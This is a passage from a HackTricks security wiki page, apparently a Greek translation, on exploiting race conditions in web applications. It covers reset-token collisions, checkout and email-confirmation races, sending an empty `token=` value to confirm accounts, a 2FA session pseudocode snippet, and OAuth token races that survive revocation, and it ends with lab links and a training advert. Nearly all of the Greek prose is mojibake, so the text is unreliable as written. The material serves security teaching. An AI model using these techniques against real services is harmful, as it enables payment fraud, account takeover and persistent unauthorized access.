* Î£Ï„ÎµÎ½Î­ÏˆÏ„Îµ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ· ÏƒÏ„Î¿Î½ ÎµÎ»Î¬Ï‡Î¹ÏƒÏ„Î¿ Î±ÏÎ¹Î¸Î¼ÏŒ Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½ Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„Î¿ÏÎ½Ï„Î±Î¹ Î³Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±, ÏƒÏ…Ï‡Î½Î¬ Î¼ÏŒÎ»Î¹Ï‚ Î´ÏÎ¿. Î‘Ï…Ï„ÏŒ Ï„Î¿ Î²Î®Î¼Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î±Î¹Ï„ÎµÎ¯ Ï€Î¿Î»Î»Î­Ï‚ Ï€ÏÎ¿ÏƒÏ€Î¬Î¸ÎµÎ¹ÎµÏ‚ Î® Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î»ÏŒÎ³Ï‰ Ï„Î·Ï‚ Î±ÎºÏÎ¹Î²Î¿ÏÏ‚ Ï‡ÏÎ¿Î½Î¹ÎºÎ®Ï‚ ÏƒÏ„Î¹Î³Î¼Î®Ï‚ Ï€Î¿Ï… ÎµÎ¼Ï€Î»Î­ÎºÎµÏ„Î±Î¹.

### Î§ÏÎ¿Î½Î¹ÎºÎ¬ Î•Ï…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Î•Ï€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚

Î— Î±ÎºÏÎ¯Î²ÎµÎ¹Î± ÏƒÏ„Î¿ Ï‡ÏÎ¿Î½Î¿Î´Î¹Î¬Î³ÏÎ±Î¼Î¼Î± Ï„Ï‰Î½ Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿ÎºÎ±Î»ÏÏˆÎµÎ¹ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚, ÎµÎ¹Î´Î¹ÎºÎ¬ ÏŒÏ„Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ Ï€ÏÎ¿Î²Î»Î­ÏˆÎ¹Î¼ÎµÏ‚ Î¼Î­Î¸Î¿Î´Î¿Î¹ ÏŒÏ€Ï‰Ï‚ Î¿Î¹ Ï‡ÏÎ¿Î½Î¹ÎºÎ­Ï‚ ÏƒÏ†ÏÎ±Î³Î¯Î´ÎµÏ‚ Î³Î¹Î± Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÎ¬ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏÎ½ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î¹Ï‚ Ï‡ÏÎ¿Î½Î¹ÎºÎ­Ï‚ ÏƒÏ†ÏÎ±Î³Î¯Î´ÎµÏ‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Ï„Î±Ï…Ï„ÏŒÏƒÎ·Î¼Î± Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÎ¬ Î³Î¹Î± Ï„Î±Ï…Ï„ÏŒÏ‡ÏÎ¿Î½ÎµÏ‚ Î±Î¹Ï„Î®ÏƒÎµÎ¹Ï‚.

**Î“Î¹Î± Î½Î± Î•ÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ:**

* Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Î±ÎºÏÎ¹Î²Î® Ï‡ÏÎ¿Î½Î¿Î´Î¹Î¬Î³ÏÎ±Î¼Î¼Î±, ÏŒÏ€Ï‰Ï‚ Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î¼Îµ Î­Î½Î± Î¼ÏŒÎ½Î¿ Ï€Î±ÎºÎ­Ï„Î¿, Î³Î¹Î± Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Ï„Î±Ï…Ï„ÏŒÏ‡ÏÎ¿Î½ÎµÏ‚ Î±Î¹Ï„Î®ÏƒÎµÎ¹Ï‚ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚. Î¤Î±Ï…Ï„ÏŒÏƒÎ·Î¼Î± Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÎ¬ Ï…Ï€Î¿Î´Î·Î»ÏÎ½Î¿Ï…Î½ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±.

**Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±:**

* Î–Î·Ï„Î®ÏƒÏ„Îµ Î´ÏÎ¿ Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÎ¬ ÎµÏ€Î±Î½Î±Ï†Î¿ÏÎ¬Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Î±Ï…Ï„ÏŒÏ‡ÏÎ¿Î½Î± ÎºÎ±Î¹ ÏƒÏ…Î³ÎºÏÎ¯Î½ÎµÏ„Î­ Ï„Î±. Î¤Î± Ï„Î±Ï…Ï„ÏŒÏƒÎ·Î¼Î± Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÎ¬ Ï…Ï€Î¿Î´Î·Î»ÏÎ½Î¿Ï…Î½ Î­Î½Î± ÏƒÏ†Î¬Î»Î¼Î± ÏƒÏ„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏÎ½.

**Î”ÎµÎ¯Ï„Îµ Î±Ï…Ï„ÏŒ** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **Î³Î¹Î± Î½Î± Ï„Î¿ Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ.**

## ÎœÎµÎ»Î­Ï„ÎµÏ‚ Î ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·Ï‚ ÎšÏÏ…Ï†ÏÎ½ Î¥Ï€Î¿ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÏ‰Î½

### Î Î»Î·ÏÏ‰Î¼Î® & Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎ· Î±Î½Ï„Î¹ÎºÎµÎ¹Î¼Î­Î½Î¿Ï…

Î”ÎµÎ¯Ï„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) Î³Î¹Î± Î½Î± Î´ÎµÎ¯Ï„Îµ Ï€ÏÏ‚ Î½Î± **Ï€Î»Î·ÏÏÏƒÎµÏ„Îµ** ÏƒÎµ Î­Î½Î± ÎºÎ±Ï„Î¬ÏƒÏ„Î·Î¼Î± ÎºÎ±Î¹ Î½Î± **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Î­Î½Î± ÎµÏ€Î¹Ï€Î»Î­Î¿Î½** Î±Î½Ï„Î¹ÎºÎµÎ¯Î¼ÎµÎ½Î¿ Ï€Î¿Ï… **Î´ÎµÎ½ Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± Ï€Î»Î·ÏÏÏƒÎµÏ„Îµ Î³Î¹' Î±Ï…Ï„ÏŒ**.

### Î•Ï€Î¹Î²ÎµÎ²Î±Î¯Ï‰ÏƒÎ· Î¬Î»Î»Ï‰Î½ email

Î— Î¹Î´Î­Î± ÎµÎ¯Î½Î±Î¹ Î½Î± **ÎµÏ€Î¹Î²ÎµÎ²Î±Î¹ÏÏƒÎµÏ„Îµ Î¼Î¹Î± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· email ÎºÎ±Î¹ Î½Î± Ï„Î·Î½ Î±Î»Î»Î¬Î¾ÎµÏ„Îµ ÏƒÎµ Î¼Î¹Î± Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ® Ï„Î±Ï…Ï„ÏŒÏ‡ÏÎ¿Î½Î±** Î³Î¹Î± Î½Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÏÏƒÎµÏ„Îµ Î±Î½ Î· Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î± ÎµÏ€Î¹Î²ÎµÎ²Î±Î¹ÏÎ½ÎµÎ¹ Ï„Î· Î½Î­Î± Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ Î±Î»Î»Î¬Î¾ÎµÎ¹.

### Î‘Î»Î»Î±Î³Î® email ÏƒÎµ 2 Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ email Î¼Îµ Î²Î¬ÏƒÎ· Ï„Î± Cookie

Î£ÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ [**Î±Ï…Ï„Î® Ï„Î·Î½ Î­ÏÎµÏ…Î½Î±**](https://portswigger.net/research/smashing-the-state-machine) Ï„Î¿ Gitlab Î®Ï„Î±Î½ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ ÏƒÎµ ÎºÎ±Ï„Î¬Î»Î·ÏˆÎ· Î¼Îµ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï„ÏÏŒÏ€Î¿ ÎµÏ€ÎµÎ¹Î´Î® Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹** Ï„Î¿ **Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ ÎµÏ€Î¹Î²ÎµÎ²Î±Î¯Ï‰ÏƒÎ·Ï‚ email Î¼Î¹Î±Ï‚ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ ÏƒÏ„Î¿ Î¬Î»Î»Î¿ email**.

**Î”ÎµÎ¯Ï„Îµ Î±Ï…Ï„ÏŒ** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **Î³Î¹Î± Î½Î± Ï„Î¿ Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ.**

### ÎšÏÏ…Ï†Î­Ï‚ ÎšÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÎ¹Ï‚ Î’Î¬ÏƒÎ·Ï‚ Î”ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ / Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Î•Ï€Î¹Î²ÎµÎ²Î±Î¯Ï‰ÏƒÎ·Ï‚

Î•Î¬Î½ **Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ 2 Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ­Ï‚ ÎµÎ³Î³ÏÎ±Ï†Î­Ï‚** Î³Î¹Î± Î½Î± **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎ¿Ï…Î½** **Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚** Î¼Î­ÏƒÎ± ÏƒÎµ Î¼Î¹Î± **Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½**, Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î¼Î¹Î± Î¼Î¹ÎºÏÎ® Ï‡ÏÎ¿Î½Î¹ÎºÎ® Ï€ÎµÏÎ¯Î¿Î´Î¿Ï‚ ÏŒÏ€Î¿Ï… **Î¼ÏŒÎ½Î¿ Ï„Î± Ï€ÏÏÏ„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î­Ï‡Î¿Ï…Î½ Î³ÏÎ±Ï†Ï„ÎµÎ¯** Î¼Î­ÏƒÎ± ÏƒÏ„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, ÏŒÏ„Î±Î½ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Îµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î·, Ï„Î¿ **ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î·** ÎºÎ±Î¹ Î¿ **ÎºÏ‰Î´Î¹ÎºÏŒÏ‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **Î³ÏÎ±Ï†Î¿ÏÎ½** ÎºÎ±Î¹ **ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Ï„Î¿ Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ** Î³Î¹Î± Î½Î± ÎµÏ€Î¹Î²ÎµÎ²Î±Î¹Ï‰Î¸ÎµÎ¯ Î¿ Î½ÎµÎ¿Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¼Î­Î½Î¿Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ Î³ÏÎ¬Ï†ÎµÏ„Î±Î¹. Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î³Î¹Î± Î¼Î¹Î± Î¼Î¹ÎºÏÎ® Ï‡ÏÎ¿Î½Î¹ÎºÎ® Ï€ÎµÏÎ¯Î¿Î´Î¿ Ï„Î¿ **Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ Î³Î¹Î± Ï„Î·Î½ ÎµÏ€Î¹Î²ÎµÎ²Î±Î¯Ï‰ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï ÎµÎ¯Î½Î±Î¹ ÎºÎµÎ½ÏŒ**.

Î•Ï€Î¿Î¼Î­Î½Ï‰Ï‚, **Î· ÎµÎ³Î³ÏÎ±Ï†Î® ÎµÎ½ÏŒÏ‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï ÎºÎ±Î¹ Î· Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® Î±ÏÎºÎµÏ„ÏÎ½ Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½ Î¼Îµ ÎºÎµÎ½ÏŒ Î´Î¹Î±ÎºÏÎ¹Ï„Î¹ÎºÏŒ** (`token=` Î® `token[]=` Î® Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î¬Î»Î»Î· Ï€Î±ÏÎ±Î»Î»Î±Î³Î®) Î³Î¹Î± Î½Î± ÎµÏ€Î¹Î²ÎµÎ²Î±Î¹ÏÏƒÎµÏ„Îµ Ï„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Î±Î¼Î­ÏƒÏ‰Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Ï„Î·Î½ **ÎµÏ€Î¹Î²ÎµÎ²Î±Î¯Ï‰ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï** ÏŒÏ€Î¿Ï… Î´ÎµÎ½ ÎµÎ»Î­Î³Ï‡ÎµÏ„Îµ Ï„Î¿ email.

**Î”ÎµÎ¯Ï„Îµ Î±Ï…Ï„ÏŒ** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **Î³Î¹Î± Î½Î± Ï„Î¿ Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ.**

### Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· 2FA

ÎŸ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏˆÎµÏ…Î´Î¿ÎºÏÎ´Î¹ÎºÎ±Ï‚ ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î¿Ï‚ ÏƒÎµ ÏƒÏ…Î½Î¸Î®ÎºÎ· Î±Î³ÏÎ½Î± ÎµÏ€ÎµÎ¹Î´Î® ÏƒÎµ Ï€Î¿Î»Ï Î¼Î¹ÎºÏÏŒ Ï‡ÏÎ¿Î½Î¹ÎºÏŒ Î´Î¹Î¬ÏƒÏ„Î·Î¼Î± Î· **2FA Î´ÎµÎ½ ÎµÏ€Î¹Î²Î¬Î»Î»ÎµÏ„Î±Î¹** ÎµÎ½Ï Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Î±Î¹ Î· ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î±:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 eternal persistence

Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î±ÏÎºÎµÏ„Î¿Î¯ [**Ï€Î±ÏÎ¿Ï‡ÎµÎ¯Ï‚ OAUth**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers). Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Î¸Î± ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎ¿Ï…Î½ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎºÎ±Î¹ Î½Î± Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ¯ÏƒÎµÎ¹ Î¿ Ï€Î±ÏÎ¿Ï‡Î­Î±Ï‚. Î“Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ, Î¿ **Ï€ÎµÎ»Î¬Ï„Î·Ï‚** Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± **ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ ÏƒÏ„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÏƒÎ±Ï‚** Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± Î±Ï€ÏŒ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï„Î¿Ï…Ï‚ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ **Ï€Î±ÏÎ¿Ï‡Î­Î± OAUth**.\
ÎˆÏ„ÏƒÎ¹, Î¼Î­Ï‡ÏÎ¹ ÎµÎ´Ï ÎµÎ¯Î½Î±Î¹ Î±Ï€Î»ÏÏ‚ Î¼Î¹Î± ÎºÎ¿Î¹Î½Î® ÏƒÏÎ½Î´ÎµÏƒÎ· Î¼Îµ google/linkedin/github... ÏŒÏ€Î¿Ï… ÏƒÎ±Ï‚ Î¶Î·Ï„ÎµÎ¯Ï„Î±Î¹ Î¼Î¹Î± ÏƒÎµÎ»Î¯Î´Î± Ï€Î¿Ï… Î»Î­ÎµÎ¹: "_Î— ÎµÏ†Î±ÏÎ¼Î¿Î³Î® \<InsertCoolName> Î¸Î­Î»ÎµÎ¹ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÎ±Ï‚, Î¸Î­Î»ÎµÏ„Îµ Î½Î± Ï„Î¿ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÏ„Îµ;_"

#### Race Condition in `authorization_code`

Î¤Î¿ **Ï€ÏÏŒÎ²Î»Î·Î¼Î±** ÎµÎ¼Ï†Î±Î½Î¯Î¶ÎµÏ„Î±Î¹ ÏŒÏ„Î±Î½ **Ï„Î¿ Î±Ï€Î¿Î´ÎµÏ‡Ï„ÎµÎ¯Ï„Îµ** ÎºÎ±Î¹ Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î± ÏƒÏ„Î­Î»Î½ÎµÎ¹ Î­Î½Î±Î½ **`authorization_code`** ÏƒÏ„Î·Î½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î®. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î±Ï…Ï„Î® Î· **ÎµÏ†Î±ÏÎ¼Î¿Î³Î® ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎµÏ„Î±Î¹ Î¼Î¹Î± Race Condition ÏƒÏ„Î¿Î½ Ï€Î±ÏÎ¿Ï‡Î­Î± Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ OAUth Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î±Ï€ÏŒ Î­Î½Î± AT/RT** (_Authentication Token/Refresh Token_) Î±Ï€ÏŒ Ï„Î¿Î½ **`authorization_code`** Î³Î¹Î± Ï„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ ÏƒÎ±Ï‚. Î’Î±ÏƒÎ¹ÎºÎ¬, Î¸Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Ï„Î¿ Î³ÎµÎ³Î¿Î½ÏŒÏ‚ ÏŒÏ„Î¹ Î­Ï‡ÎµÏ„Îµ Î±Ï€Î¿Î´ÎµÏ‡Ï„ÎµÎ¯ Ï„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÎ±Ï‚ Î³Î¹Î± Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î±ÏÎºÎµÏ„Î¿ÏÏ‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚**. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î±Î½ **ÏƒÏ„Î±Î¼Î±Ï„Î®ÏƒÎµÏ„Îµ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Îµ ÏƒÏ„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÏƒÎ±Ï‚, Î­Î½Î± Î¶ÎµÏ…Î³Î¬ÏÎ¹ AT/RT Î¸Î± Î´Î¹Î±Î³ÏÎ±Ï†ÎµÎ¯, Î±Î»Î»Î¬ Ï„Î± Î¬Î»Î»Î± Î¸Î± Ï€Î±ÏÎ±Î¼ÎµÎ¯Î½Î¿Ï…Î½ Î­Î³ÎºÏ…ÏÎ±**.

#### Race Condition in `Refresh Token`

ÎœÏŒÎ»Î¹Ï‚ Î­Ï‡ÎµÏ„Îµ **Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Î­Î½Î± Î­Î³ÎºÏ…ÏÎ¿ RT**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± **Ï„Î¿ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î±ÏÎºÎµÏ„Î¬ AT/RT** ÎºÎ±Î¹ **Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ Î±Î½ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î±ÎºÏ…ÏÏÏƒÎµÎ¹ Ï„Î¹Ï‚ Î¬Î´ÎµÎ¹ÎµÏ‚** Î³Î¹Î± Ï„Î·Î½ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï„Î¿Ï…, **Î±ÏÎºÎµÏ„Î¬ RT Î¸Î± Ï€Î±ÏÎ±Î¼ÎµÎ¯Î½Î¿Ï…Î½ Î­Î³ÎºÏ…ÏÎ±.**

## **RC in WebSockets**

Î£Ï„Î¿ [**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î± PoC ÏƒÎµ Java Î³Î¹Î± Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Î¼Î·Î½ÏÎ¼Î±Ï„Î± websocket ÏƒÎµ **Ï€Î±ÏÎ¬Î»Î»Î·Î»Î·** ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· **Race Conditions ÎºÎ±Î¹ ÏƒÎµ Web Sockets**.

## References

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_source=hacktricks\&utm\_medium=text\&utm\_campaign=ppc\&utm\_term=trickest\&utm\_content=race-condition) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=race-condition" %}
